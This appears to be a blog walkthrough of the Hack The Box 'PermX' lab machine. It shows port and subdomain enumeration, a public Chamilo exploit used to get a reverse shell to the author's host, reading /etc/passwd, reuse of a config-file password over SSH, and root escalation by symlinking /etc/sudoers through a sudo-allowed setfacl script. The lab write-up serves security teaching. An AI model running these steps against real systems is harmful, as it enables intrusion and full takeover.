---
title: Permx machine HTB
cover: ./permx-img/permx.png
date: 2024-07-28T22:25:00+03:00
draft: false
---

---

## Introduction

This machine is recent and does not have any information other than that it is a Linux machine. From the name we 
can deduce that it has to do with the issue of permissions on files and abuse it.

---

>Target machine IP:
>10.129.55.224

---

### Pinging the machine

```sh
> ping -c 1 10.129.55.224
PING 10.129.55.224 (10.129.55.224) 56(84) bytes of data.
64 bytes from 10.129.55.224: icmp_seq=1 ttl=63 time=241 ms

--- 10.129.55.224 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 241.007/241.007/241.007/0.000 ms
```

---

## Enumeration

### Nmap initial scan

As always we start with a basic enumeration of the ports that are open on the machine.

```sh
sudo nmap -p- --min-rate 5000 --open -n -Pn 10.129.55.224 -oX open_port-scan.xml -oN open_port-scan
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-28 17:28 -03
Nmap scan report for 10.129.55.224
Host is up (0.21s latency).
Not shown: 65510 closed tcp ports (reset), 23 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 15.28 seconds
```

### Results

-puerto 22 open (SSH)
-puerto 80 open (HTTP)

### Script and version scan of ports 22,80

```sh
 sudo nmap -p22,80 -sVC --min-rate 5000 10.129.55.224 -oX version_scripts-scan.xml -oN version_srcripts-scan
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-28 17:34 -03
Nmap scan report for 10.129.55.224
Host is up (0.24s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)
|_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://permx.htb
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.98 seconds

```

### Results

-puerto 22 OpenSSH 8.9p1 (Ubuntu Linux; protocol 2.0)
-puerto 80 Apache httpd 2.4.52
  _http-title: Did not follow redirect to http: //permx.htb

---

### Analyzing the Web site hosted port 80

First we add the Vhost to the file etc/hosts

{{< image src="../../../permx-img/01-etc-host-file.png" alt="host file" position="center" style="border-radius: 8px;" >}}

Now we go to the browser and put the ip in the bar.

{{< image src="../../../permx-img/02-permx-home-page.png" alt="browser" position="center" style="border-radius: 8px;" >}}

### Page recognition (whatweb)

```sh
❯ whatweb http://permx.htb
http://permx.htb [200 OK] Apache[2.4.52], Bootstrap, Country[RESERVED][ZZ], Email[permx@htb.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.129.55.224], JQuery[3.4.1], Script, Title[eLEARNING]
```

---

### Web site directory Enumeration

```sh
 dirsearch -u http://permx.htb

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11723

Output: /home/donatello/Documentos/HTB-Machines/XPerm/nmap/reports/http_permx.htb/__24-07-28_18-00-59.txt

Target: http://permx.htb/

[18:00:59] Starting: 
[18:01:03] 301 -  303B  - /js  ->  http://permx.htb/js/
[18:01:16] 403 -  274B  - /.ht_wsr.txt
[18:01:16] 403 -  274B  - /.htaccess.orig
[18:01:16] 403 -  274B  - /.htaccess_extra
[18:01:16] 403 -  274B  - /.htaccess.sample
[18:01:16] 403 -  274B  - /.htaccess.save
[18:01:16] 403 -  274B  - /.htaccessBAK
[18:01:16] 403 -  274B  - /.htaccess_sc
[18:01:16] 403 -  274B  - /.htaccessOLD2
[18:01:16] 403 -  274B  - /.htaccessOLD
[18:01:16] 403 -  274B  - /.htm
[18:01:16] 403 -  274B  - /.html
[18:01:16] 403 -  274B  - /.htaccess.bak1
[18:01:16] 403 -  274B  - /.htaccess_orig
[18:01:17] 403 -  274B  - /.htpasswd_test
[18:01:17] 403 -  274B  - /.htpasswds
[18:01:17] 403 -  274B  - /.httr-oauth
[18:01:22] 403 -  274B  - /.php
[18:01:36] 200 -   10KB - /404.html
[18:01:43] 200 -   20KB - /about.html
[18:02:44] 200 -   14KB - /contact.html
[18:02:47] 301 -  304B  - /css  ->  http://permx.htb/css/
[18:03:14] 301 -  304B  - /img  ->  http://permx.htb/img/
[18:03:21] 200 -  922B  - /js/
[18:03:23] 301 -  304B  - /lib  ->  http://permx.htb/lib/
[18:03:24] 200 -    2KB - /lib/
[18:03:24] 200 -    1KB - /LICENSE.txt
[18:04:11] 403 -  274B  - /server-status/
[18:04:11] 403 -  274B  - /server-status

Task Completed
```

After finding nothing redundant and being lost for a while I remembered to search for subdomains with ffuf.

```sh
 ./ffuf -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://permx.htb" -H "host: FUZZ.permx.htb" -fc 302

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://permx.htb
 :: Wordlist         : FUZZ: /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.permx.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 302
________________________________________________

www                     [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 347ms]
lms                     [Status: 200, Size: 19347, Words: 4910, Lines: 353, Duration: 204ms]
:: Progress: [4989/4989] :: Job [1/1] :: 160 req/sec :: Duration: [0:00:26] :: Errors: 0 ::
```

We found a lms subdomain which we will add to the /etc/host file.

---

### Browsing the subdomain

There we found a login page that has a supposed administrator name Davis Miller and runs an LMS called Chamilo.

>Chamilo is an open-source learning management and collaboration system

Thanks to wappalyzer we can see what runs behind, PHP

{{< image src="../../../permx-img/03-wappalyzer-chamilo.png" alt="wappalyzer" position="center" style="border-radius: 8px;" >}}

We also found out that the version of chamilo running is 1.11

---

### Exploiting Chamilo 1.11

We searched the net to see if there is an exploit for this version.

{{< image src="../../../permx-img/04-exploit-found.png" alt="exploit chamilo 1.11" position="center" style="border-radius: 8px;" >}}

[GithubRai2en](https://github.com/Rai2en/CVE-2023-4220-Chamilo-LMS?tab=readme-ov-file)

Now we must clone the repository in our machine and execute using a venv with python the requirements of the script.

{{< image src="../../../permx-img/05-exploit-clone.png" alt="clone repo" position="center" style="border-radius: 8px;" >}}

Once cloned and inside the exploit directory, we create our venv and activate it so we can install the requirements.

{{< image src="../../../permx-img/06-venv-python.png" alt="venv" position="center" style="border-radius: 8px;" >}}
{{< image src="../../../permx-img/06b-venv-activate.png" alt="venv" position="center" style="border-radius: 8px;" >}}
{{< image src="../../../permx-img/07-install-requirements.png" alt="venv" position="center" style="border-radius: 8px;" >}}

With everything ready, we run the scan mode to verify that the subdomain is vulnerable.

{{< image src="../../../permx-img/08-using-exploit-scan.png" alt="exploit chamilo 1.11" position="center" style="border-radius: 8px;" >}}

Now we must use the revshell mode

{{< image src="../../../permx-img/09-using-exploit-revshell.png" alt="exploit chamilo 1.11" position="center" style="border-radius: 8px;" >}}

### Usage

-First it asks you to enter the type of shell to use: bash.
-Then we hit enter to use the default one, if you want you can upload your own revshell file.
-Then we enter our IP
-Finally the port we are going to be listening on e.g. 443

```sh
Enter the name of the webshell file that will be placed on the target server (default: webshell.php): bash
Enter the name of the bash revshell file that will be placed on the target server (default: revshell.sh): 
Enter the host the target server will connect to when the revshell is run: 10.10.16.47
Enter the port on the host the target server will connect to when the revshell is run: 443
```

Before executing the exploit we open another terminal and go into listening mode with netcat on the chosen port

```sh
❯ sudo nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.16.47] from (UNKNOWN) [10.129.55.224] 53538
bash: cannot set terminal process group (1132): Inappropriate ioctl for device
bash: no job control in this shell
www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$ 
```

Ready, we are in, now we must see which users are in the system.

```sh
www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
[..snif..]
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
mtz:x:1000:1000:mtz:/home/mtz:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false
```

In the passwd file there is the user mtz that has access to a bash terminal.

So as we saw in the listing of the Chamilo directories there is the app directory which has the config directory and there is the configuration.php file. There we can see the configuration of the application.

{{< image src="../../../permx-img/10-inside-machin-configuration.png" alt="inside the machine" position="center" style="border-radius: 8px;" >}}

Inside this file we can find this password which we could use to access via SSH using the user mtz

{{< image src="../../../permx-img/11-inside-machine-password.png" alt="inside the machine" position="center" style="border-radius: 8px;" >}}

---

### Logging in via SSH as the user mtz

{{< image src="../../../permx-img/12-ssh-login-mtz.png" alt="SSH login" position="center" style="border-radius: 8px;" >}}

Ready, we already have access as the user mtz, now we only have to look for the flag and upload it to HTB.

{{< image src="../../../permx-img/13-user-flag.png" alt="user flag" position="center" style="border-radius: 8px;" >}}

Now the first thing we should do is to see if we have privileges as sudoer, this can be done with the command sudo -l , which will tell us if we have access to any executable file as root (sudo).

```sh
mtz@permx:~$ sudo -l
Matching Defaults entries for mtz on permx:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User mtz may run the following commands on permx:
    (ALL : ALL) NOPASSWD: /opt/acl.sh
mtz@permx:~$ export TERM=xterm
```

>As I am using a kitty terminal, it is better to change the terminal to avoid problems when executing a command that is not compatible.

The result tells us that we have access to run that file as root, so let's see what this file does and how we can make use of it.

```sh
mtz@permx:~$ cat /opt/acl.sh 
#!/bin/bash

if [ "$#" -ne 3 ]; then
    /usr/bin/echo "Usage: $0 user perm file"
    exit 1
fi

user="$1"
perm="$2"
target="$3"

if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
    /usr/bin/echo "Access denied."
    exit 1
fi

# Check if the path is a file
if [ ! -f "$target" ]; then
    /usr/bin/echo "Target must be a file."
    exit 1
fi

/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
mtz@permx:~$ 
```

It seems that this script is used to change the permissions or give permissions to a target file, this is very interesting because we can abuse this by giving us full permissions on the sudoers file.

To do this we must create a symlink to the file in question and then give it the necessary permissions with the script that has elevated privileges so we can modify it and add us as a privileged user.

```sh
mtz@permx:~$ ln -s /etc/sudoers symlink
mtz@permx:~$ ls
symlink  user.txt
```

Now let's use the acl.sh file

```sh
mtz@permx:~$ sudo /opt/acl.sh mtz rwx /home/mtz/symlink
mtz@permx:~$ ls
symlink  user.txt
```

It seems that everything went well, so now we can open the file with nano and give us elevated privileges.

```sh
mtz@permx:~$ nano /home/mtz/symlink
```

{{< image src="../../../permx-img/14-root-privileges.png" alt="nano" position="center" style="border-radius: 8px;" >}}

Now we do sudo su and log in as the root user

{{< image src="../../../permx-img/15-root-access.png" alt="sudo su" position="center" style="border-radius: 8px;" >}}
{{< image src="../../../permx-img/16-root-access-success.png" alt="sudo su" position="center" style="border-radius: 8px;" >}}

And now to finish we can get the Root user flag

{{< image src="../../../permx-img/17-root-flag.png" alt="root flag" position="center" style="border-radius: 8px;" >}}

I hope you had fun solving this machine, it was an excellent experience to put into practice our knowledge about file abuse and permissions in Linux, see you next time!
